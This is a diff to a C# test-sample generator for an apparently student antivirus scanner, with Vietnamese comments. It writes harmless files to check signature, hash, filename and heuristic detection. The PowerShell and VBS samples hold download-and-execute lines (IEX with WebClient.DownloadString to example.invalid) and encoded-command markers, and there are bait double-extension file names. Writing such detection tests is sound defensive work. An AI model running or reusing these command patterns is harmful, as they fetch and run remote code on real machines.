@@ -1,4 +1,4 @@
-using System;
+/*using System;
 using System.Collections.Generic;
 using System.IO;
 
@@ -92,6 +92,445 @@ namespace ScanAndRemoveVirus.Services
             if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Normal);
             File.WriteAllText(path, content);
             return path;
+        }
+    }
+}
+*/
+
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text;
+
+namespace ScanAndRemoveVirus.Services
+{
+    /// <summary>
+    /// Bộ tệp mẫu VÔ HẠI dùng để kiểm thử ScanEngine.
+    ///
+    /// Bao gồm:
+    /// - Mẫu chữ ký prefix.
+    /// - Mẫu SHA256.
+    /// - Mẫu EICAR theo tên.
+    /// - Các mẫu heuristic.
+    /// - Các mẫu đối chứng sạch.
+    ///
+    /// TestSamples KHÔNG truy cập SQL Server trực tiếp.
+    ///
+    /// Sau khi ScanEngine được chuyển sang VirusSignatureRepository:
+    ///
+    /// TestSamples
+    ///      ↓
+    /// ScanEngine
+    ///      ↓
+    /// VirusSignatureRepository
+    ///      ↓
+    /// dbo.VirusSignatures
+    ///
+    /// Riêng mẫu prefix vẫn được giữ local vì CSDL hiện tại
+    /// không có cột chứa nội dung/pattern của chữ ký prefix.
+    /// </summary>
+    public static class TestSamples
+    {
+        // =========================================================
+        // TÊN CÁC FILE MẪU
+        // =========================================================
+
+        /// <summary>
+        /// KT1: kiểm tra chữ ký prefix ở đầu file.
+        /// </summary>
+        public const string SignatureSampleName =
+            "mau-ky-hieu.txt";
+
+        /// <summary>
+        /// KT1: kiểm tra SHA256 với bảng chữ ký.
+        /// </summary>
+        public const string HashSampleName =
+            "mau-hash-sha256.txt";
+
+        /// <summary>
+        /// KT1: kiểm tra luật tên chứa "eicar".
+        /// </summary>
+        public const string EicarNameSample =
+            "demo_eicar_named.dat";
+
+        /// <summary>
+        /// KT2: đuôi kép + tên mồi câu.
+        /// </summary>
+        public const string SpoofSampleName =
+            "thong-bao-hoa-don-invoice.pdf.exe";
+
+        /// <summary>
+        /// KT2: script PowerShell chứa marker nghi vấn.
+        /// </summary>
+        public const string ScriptSampleName =
+            "update-flash.ps1";
+
+        /// <summary>
+        /// KT2: executable ẩn + tên mồi câu.
+        /// </summary>
+        public const string HiddenExeName =
+            "thong-bao-crack-hidden.exe";
+
+        /// <summary>
+        /// KT2: VBS chứa nhiều marker nghi vấn.
+        /// </summary>
+        public const string VbsSampleName =
+            "downloader-tien-ich.vbs";
+
+        /// <summary>
+        /// KT1: prefix signature trên file JS.
+        /// </summary>
+        public const string JsPrefixName =
+            "hook-tien-ich.js";
+
+        /// <summary>
+        /// Đối chứng:
+        /// tên mồi câu nhưng điểm heuristic dưới ngưỡng.
+        /// </summary>
+        public const string CrackedExeName =
+            "keygen-pro.exe";
+
+        /// <summary>
+        /// Đối chứng script sạch.
+        /// </summary>
+        public const string CleanScriptName =
+            "script-sach.ps1";
+
+        /// <summary>
+        /// Đối chứng file văn bản sạch.
+        /// </summary>
+        public const string BenignSampleName =
+            "README-mau.txt";
+
+        // =========================================================
+        // CACHE FOLDER
+        // =========================================================
+
+        private static string cachedFolder;
+
+        // =========================================================
+        // FOLDER PATH
+        // =========================================================
+
+        /// <summary>
+        /// Tìm thư mục TestSamples ở gần project.
+        ///
+        /// Khi chạy từ:
+        ///
+        /// bin\Debug
+        /// bin\Release
+        ///
+        /// chương trình sẽ đi ngược lên tối đa 7 cấp
+        /// để tìm thư mục TestSamples.
+        ///
+        /// Nếu không tìm thấy thì dùng:
+        ///
+        /// Desktop\XVirus-Samples
+        /// </summary>
+        public static string FolderPath
+        {
+            get
+            {
+                if (!string.IsNullOrEmpty(cachedFolder))
+                {
+                    return cachedFolder;
+                }
+
+                try
+                {
+                    DirectoryInfo directory =
+                        new DirectoryInfo(
+                            AppDomain.CurrentDomain.BaseDirectory);
+
+                    for (int hop = 0;
+                         hop < 7 && directory != null;
+                         hop++)
+                    {
+                        string candidate =
+                            Path.Combine(
+                                directory.FullName,
+                                "TestSamples");
+
+                        if (Directory.Exists(candidate))
+                        {
+                            cachedFolder = candidate;
+                            return cachedFolder;
+                        }
+
+                        directory = directory.Parent;
+                    }
+                }
+                catch (Exception)
+                {
+                    // Nếu không tìm được repo thì fallback Desktop.
+                }
+
+                string desktop =
+                    Environment.GetFolderPath(
+                        Environment.SpecialFolder.DesktopDirectory);
+
+                cachedFolder =
+                    Path.Combine(
+                        desktop,
+                        "XVirus-Samples");
+
+                return cachedFolder;
+            }
+        }
+
+        // =========================================================
+        // CREATE
+        // =========================================================
+
+        /// <summary>
+        /// Tạo hoặc ghi đè toàn bộ bộ mẫu kiểm thử.
+        ///
+        /// Có thể gọi nhiều lần.
+        /// </summary>
+        public static List<string> Create()
+        {
+            Directory.CreateDirectory(FolderPath);
+
+            var created =
+                new List<string>();
+
+            // =====================================================
+            // KT1 - PREFIX SIGNATURE
+            // =====================================================
+
+            /*
+             * TestSignature vẫn được giữ trong ScanEngine.
+             *
+             * CSDL VirusSignatures hiện tại không có cột
+             * chứa pattern/prefix nên không đưa mẫu này vào SQL.
+             */
+            created.Add(
+                Write(
+                    SignatureSampleName,
+                    ScanEngine.TestSignature +
+                    "day-la-mau-gia-lap-vo-hai"));
+
+            // =====================================================
+            // KT1 - SHA256
+            // =====================================================
+
+            /*
+             * Nội dung này có SHA256 cố định.
+             *
+             * Sau khi ScanEngine được kết nối hoàn toàn với
+             * VirusSignatureRepository, SHA256 của nội dung này
+             * phải tồn tại trong dbo.VirusSignatures để engine
+             * phát hiện thông qua CSDL.
+             */
+            created.Add(
+                Write(
+                    HashSampleName,
+                    ScanEngine.SignatureSampleContent));
+
+            // =====================================================
+            // KT1 - EICAR NAME RULE
+            // =====================================================
+
+            created.Add(
+                Write(
+                    EicarNameSample,
+                    "Ten trung chuan EICAR " +
+                    "chi de duoc phat hien theo ten."));
+
+            // =====================================================
+            // KT2 - DOUBLE EXTENSION
+            // =====================================================
+
+            created.Add(
+                Write(
+                    SpoofSampleName,
+                    "Khong phai PE that - " +
+                    "chi-la-mau-duoi-kep."));
+
+            // =====================================================
+            // KT2 - POWERSHELL
+            // =====================================================
+
+            created.Add(
+                Write(
+                    ScriptSampleName,
+
+                    "$ErrorActionPreference=" +
+                    "'SilentlyContinue';" +
+
+                    "IEX(New-Object Net.WebClient)." +
+                    "DownloadString(" +
+                    "'http://example.invalid/p');" +
+
+                    " $e=[Text.Encoding]::Unicode." +
+                    "GetString(" +
+                    "[Convert]::FromBase64String(" +
+                    "'TQ=='));" +
+
+                    " powershell -nop -enc TQ=="));
+
+            // =====================================================
+            // KT2 - HIDDEN EXECUTABLE
+            // =====================================================
+
+            string hiddenPath =
+                Write(
+                    HiddenExeName,
+                    "Khong phai PE that - " +
+                    "mau exe-an-moi-cau.");
+
+            created.Add(hiddenPath);
+
+            try
+            {
+                File.SetAttributes(
+                    hiddenPath,
+                    FileAttributes.Hidden);
+            }
+            catch (Exception)
+            {
+                /*
+                 * Nếu không đặt được Hidden thì vẫn giữ file mẫu.
+                 * Khi đó riêng vector Hidden có thể không đạt điểm
+                 * heuristic như mong muốn.
+                 */
+            }
+
+            // =====================================================
+            // KT2 - VBS MARKERS
+            // =====================================================
+
+            created.Add(
+                Write(
+                    VbsSampleName,
+
+                    "' mo phong PowerShell: " +
+                    "IEX(New-Object Net.WebClient)." +
+                    "DownloadString(" +
+                    "'http://example.invalid/x')" +
+                    "\r\n" +
+
+                    "' gia ma: " +
+                    "FromBase64String('QQ==') " +
+                    "roi thuc thi" +
+                    "\r\n" +
+
+                    "WScript.Echo " +
+                    "\"mau vbs vo hai - chi la text\""));
+
+            // =====================================================
+            // KT1 - PREFIX TRÊN JS
+            // =====================================================
+
+            /*
+             * Prefix phải bắt đầu ngay tại byte 0.
+             *
+             * Không thêm khoảng trắng/BOM trước TestSignature.
+             */
+            created.Add(
+                Write(
+                    JsPrefixName,
+                    ScanEngine.TestSignature +
+                    "javascript-sig-mock"));
+
+            // =====================================================
+            // ĐỐI CHỨNG - DƯỚI NGƯỠNG HEURISTIC
+            // =====================================================
+
+            created.Add(
+                Write(
+                    CrackedExeName,
+                    "Khong phai PE that - " +
+                    "mau moi cau duoi nguong."));
+
+            // =====================================================
+            // ĐỐI CHỨNG - SCRIPT SẠCH
+            // =====================================================
+
+            created.Add(
+                Write(
+                    CleanScriptName,
+
+                    "# script-sach: " +
+                    "don dep file tam" +
+                    "\r\n" +
+
+                    "Get-ChildItem $env:TEMP " +
+                    "-Filter '*.log' | " +
+                    "Remove-Item -Confirm:$false" +
+                    "\r\n"));
+
+            // =====================================================
+            // ĐỐI CHỨNG - TXT SẠCH
+            // =====================================================
+
+            created.Add(
+                Write(
+                    BenignSampleName,
+
+                    "Day la tep doi chung SACH. " +
+                    "Tep nay khong chua chu ky " +
+                    "hoac marker nguy hiem."));
+
+            return created;
+        }
+
+        // =========================================================
+        // WRITE
+        // =========================================================
+
+        /// <summary>
+        /// Ghi một file mẫu.
+        ///
+        /// Sử dụng UTF8 không BOM để đảm bảo chữ ký prefix
+        /// nằm chính xác tại byte 0.
+        /// </summary>
+        private static string Write(
+            string name,
+            string content)
+        {
+            string path =
+                Path.Combine(
+                    FolderPath,
+                    name);
+
+            try
+            {
+                /*
+                 * File Hidden hoặc ReadOnly có thể không
+                 * ghi đè được.
+                 *
+                 * Vì vậy đưa về Normal trước khi ghi.
+                 */
+                if (File.Exists(path))
+                {
+                    File.SetAttributes(
+                        path,
+                        FileAttributes.Normal);
+                }
+
+                /*
+                 * QUAN TRỌNG:
+                 *
+                 * UTF8Encoding(false) = UTF-8 không BOM.
+                 *
+                 * Điều này đảm bảo:
+                 *
+                 * ScanEngine.TestSignature
+                 *
+                 * nằm ngay tại byte 0 đối với mẫu prefix.
+                 */
+                File.WriteAllText(
+                    path,
+                    content ?? "",
+                    new UTF8Encoding(false));
+
+                return path;
+            }
+            catch
+            {
+                throw;
+            }
         }
     }
 }
